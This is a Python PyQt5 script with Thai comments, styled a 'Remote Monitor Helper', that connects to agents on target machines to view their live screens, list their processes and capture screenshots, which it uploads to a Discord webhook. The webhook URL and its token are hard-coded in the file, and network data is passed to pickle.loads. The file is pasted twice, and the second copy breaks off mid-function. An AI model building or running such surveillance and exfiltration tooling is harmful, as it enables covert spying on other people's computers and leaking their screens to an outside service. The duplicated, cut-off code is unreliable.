import socket
import pickle
import struct
import sys
import threading
import requests
import tempfile
from PyQt5.QtWidgets import QApplication, QLabel, QWidget
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QImage, QPixmap
import cv2

# ---------------------- PORTS ----------------------
PORT_SCREEN = 5001
PORT_PROCESS = 5002
PORT_INFO = 5003

targets = []  # เก็บ tuple (hostname, IP)

# ---------------------- ฟังก์ชันดึง Target ----------------------
def scan_target(ip):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(2)
        client.connect((ip, PORT_INFO))
        data = client.recv(1024).decode()
        hostname, ip_addr = data.split("|")
        client.close()
        return hostname, ip_addr
    except:
        return None

# ---------------------- ส่ง Screenshot ไป Discord ----------------------
def send_screenshot_to_discord(image_bytes, webhook_url):
    with tempfile.NamedTemporaryFile(delete=True, suffix=".png") as tmp:
        tmp.write(image_bytes)
        tmp.flush()
        files = {"file": open(tmp.name, "rb")}
        r = requests.post(webhook_url, files=files)
        if r.status_code == 204:
            print("[Discord] ส่งรูปสำเร็จ")
        else:
            print("[Discord] ส่งไม่สำเร็จ:", r.status_code)

# ---------------------- Live Screen Overlay ----------------------
class LiveScreenWindow(QWidget):
    def __init__(self, target_ip, hostname):
        super().__init__()
        self.setWindowTitle(f"Live Screen - {hostname} ({target_ip})")
        self.setWindowFlags(Qt.WindowStaysOnTopHint)  # ลอยหน้าจอ
        self.resize(400, 300)
        self.label = QLabel(self)
        self.label.resize(self.size())

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((target_ip, PORT_SCREEN))
        self.data = b""
        self.payload_size = struct.calcsize(">L")

        self.timer = QTimer()
        self.timer.timeout.connect(self.update_frame)
        self.timer.start(30)  # ~30 FPS
        self.current_frame = None

    def update_frame(self):
        try:
            while len(self.data) < self.payload_size:
                self.data += self.client.recv(4096)
            packed_size = self.data[:self.payload_size]
            self.data = self.data[self.payload_size:]
            msg_size = struct.unpack(">L", packed_size)[0]
            while len(self.data) < msg_size:
                self.data += self.client.recv(4096)
            frame_data = self.data[:msg_size]
            self.data = self.data[msg_size:]
            frame = pickle.loads(frame_data)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            self.current_frame = frame
            h, w, ch = frame.shape
            qimg = QImage(frame.data, w, h, ch*w, QImage.Format_RGB888)
            self.label.setPixmap(QPixmap.fromImage(qimg).scaled(
                self.label.width(), self.label.height()))
        except:
            pass

# ---------------------- Process ----------------------
def view_process(target_ip, hostname):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, PORT_PROCESS))
        data = client.recv(16384).decode(errors="ignore")
        print(f"\n=== Process List ของ {hostname} ({target_ip}) ===")
        print(data)
        print("======================================\n")
        client.close()
    except:
        print("[ERROR] ไม่สามารถเชื่อมต่อ Target เพื่อดู Process")
    input("กด Enter เพื่อกลับเมนู...")

# ---------------------- Screenshot จาก Target ----------------------
def take_screenshot_target(target_ip, hostname):
    webhook = input("https://discord.com/api/webhooks/1414653267526553720/R10GTkSCu13huR54bhXkUKI27uGQFRApidMlmgloDWqZEPOLp0Zrehg979tYW5I56SjW").strip()
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, PORT_SCREEN))
        data = b""; payload_size = struct.calcsize(">L")
        while len(data) < payload_size:
            data += client.recv(4096)
        packed_size = data[:payload_size]; data = data[payload_size:]
        msg_size = struct.unpack(">L", packed_size)[0]
        while len(data) < msg_size:
            data += client.recv(4096)
        frame_data = data[:msg_size]; client.close()
        frame = pickle.loads(frame_data)
        _, buf = cv2.imencode(".png", frame)
        send_screenshot_to_discord(buf.tobytes(), webhook)
    except Exception as e:
        print("[ERROR] ไม่สามารถถ่าย Screenshot:", e)

# ---------------------- เพิ่ม Target ----------------------
def add_target_manual():
    ip = input("ใส่ IP ของ Target: ").strip()
    res = scan_target(ip)
    if res:
        targets.append(res)
        print(f"[INFO] เพิ่ม Target: {res[0]} {res[1]}")
    else:
        print("[ERROR] ไม่สามารถเชื่อมต่อหรือหา Target ได้")

def show_targets():
    if not targets:
        print("ยังไม่มี Target")
        return
    print("=== Target List ===")
    for i, t in enumerate(targets):
        print(f"{i+1}) {t[0]} {t[1]}")

# ---------------------- เมนูหลัก ----------------------
def menu(app):
    global targets
    while True:
        print("\n====== Remote Monitor Helper ======")
        show_targets()
        print("\n1) ขอรายการ Target (ใส่ IP หลายเครื่องคั่นด้วย comma)")
        print("2) เพิ่ม Target ด้วยการใส่ IP เอง")
        print("3) ดู Live Screen (หน้าต่างลอย)")
        print("4) ดูรายชื่อ Process")
        print("5) Screenshot ส่ง Discord")
        print("6) ออก")
        choice = input("เลือกเมนู: ")

        if choice == "1":
            targets.clear()
            ips = input("ใส่ IP Target หลายเครื่องคั่นด้วย comma: ").split(",")
            for ip in ips:
                ip = ip.strip()
                res = scan_target(ip)
                if res: targets.append(res)
            print("[INFO] เสร็จสิ้น ขอรายการ Target")
        elif choice == "2":
            add_target_manual()
        elif choice == "3":
            if not targets:
                print("ต้องมี Target ก่อน")
                continue
            sel = int(input("เลือกเครื่องดู Live Screen: ")) - 1
            t_ip, t_name = targets[sel][1], targets[sel][0]
            # เปิดหน้าต่างลอยใน thread
            def open_window():
                win = LiveScreenWindow(t_ip, t_name)
                win.show()
                app.exec_()
            threading.Thread(target=open_window, daemon=True).start()
        elif choice == "4":
            if not targets:
                print("ต้องมี Target ก่อน")
                continue
            sel = int(input("เลือกเครื่องดู Process: ")) - 1
            view_process(targets[sel][1], targets[sel][0])
        elif choice == "5":
            if not targets:
                print("ต้องมี Target ก่อน")
                continue
            sel = int(input("เลือกเครื่องถ่าย Screenshot: ")) - 1
            take_screenshot_target(targets[sel][1], targets[sel][0])
        elif choice == "6":
            sys.exit(0)
        else:
            print("กรุณาเลือกใหม่")

# ---------------------- Main ----------------------
if __name__ == "__main__":
    app = QApplication(sys.argv)
    threading.Thread(target=lambda: menu(app), daemon=True).start()
    sys.exit(app.exec_())￼Enter socket
import pickle
import struct
import sys
import threading
import requests
import tempfile
from PyQt5.QtWidgets import QApplication, QLabel, QWidget
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QImage, QPixmap
import cv2

# ---------------------- PORTS ----------------------
PORT_SCREEN = 5001
PORT_PROCESS = 5002
PORT_INFO = 5003

targets = []  # เก็บ tuple (hostname, IP)

# ---------------------- ฟังก์ชันดึง Target ----------------------
def scan_target(ip):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(2)
        client.connect((ip, PORT_INFO))
        data = client.recv(1024).decode()
        hostname, ip_addr = data.split("|")
        client.close()
        return hostname, ip_addr
    except:
        return None

# ---------------------- ส่ง Screenshot ไป Discord ----------------------
def send_screenshot_to_discord(image_bytes, webhook_url):
    with tempfile.NamedTemporaryFile(delete=True, suffix=".png") as tmp:
        tmp.write(image_bytes)
        tmp.flush()
        files = {"file": open(tmp.name, "rb")}
        r = requests.post(webhook_url, files=files)
        if r.status_code == 204:
            print("[Discord] ส่งรูปสำเร็จ")
        else:
            print("[Discord] ส่งไม่สำเร็จ:", r.status_code)

# ---------------------- Live Screen Overlay ----------------------
class LiveScreenWindow(QWidget):
    def __init__(self, target_ip, hostname):
        super().__init__()
        self.setWindowTitle(f"Live Screen - {hostname} ({target_ip})")
        self.setWindowFlags(Qt.WindowStaysOnTopHint)  # ลอยหน้าจอ
        self.resize(400, 300)
        self.label = QLabel(self)
        self.label.resize(self.size())

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((target_ip, PORT_SCREEN))
        self.data = b""
        self.payload_size = struct.calcsize(">L")

        self.timer = QTimer()
        self.timer.timeout.connect(self.update_frame)
        self.timer.start(30)  # ~30 FPS
        self.current_frame = None

    def update_frame(self):
        try:
            while len(self.data) < self.payload_size:
                self.data += self.client.recv(4096)
            packed_size = self.data[:self.payload_size]
            self.data = self.data[self.payload_size:]
            msg_size = struct.unpack(">L", packed_size)[0]
            while len(self.data) < msg_size:
                self.data += self.client.recv(4096)
            frame_data = self.data[:msg_size]
            self.data = self.data[msg_size:]
            frame = pickle.loads(frame_data)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            self.current_frame = frame
            h, w, ch = frame.shape
            qimg = QImage(frame.data, w, h, ch*w, QImage.Format_RGB888)
            self.label.setPixmap(QPixmap.fromImage(qimg).scaled(
                self.label.width(), self.label.height()))
